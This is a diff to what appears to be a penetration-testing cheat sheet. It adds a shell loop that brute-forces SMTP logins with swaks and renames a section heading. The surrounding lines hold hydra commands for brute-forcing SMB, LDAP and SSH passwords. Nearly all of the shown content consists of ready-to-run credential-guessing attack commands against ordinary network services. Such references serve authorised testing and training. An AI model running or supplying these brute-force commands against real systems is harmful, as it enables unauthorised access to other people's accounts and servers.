@@ -231,8 +231,10 @@ The following table uses the $ip variable which can be set with the following co
 | hydra -L usernames.txt -P passwords.txt $ip smb -V -f | SMB Brute Forcing |
 | hydra -L users.txt -P passwords.txt $ip ldap2 -V -f | LDAP Brute Forcing |
   
+# swaks bruteforce to send email 
+for i in $(cat passwords.txt); do echo "=== Trying Password: "$i"===" ; swaks --to user@email.com--from user@email.com --server mail.server.com --auth LOGIN --auth-user user@email.com --auth-password $i --tls --data "Subject: hello\n wellcome"; done
 
-# Brute Force
+# Brute Force hydra more commands
 SSH
 Command to attack:
 hydra -l user -P passwords.txt IP_VICTIM ssh
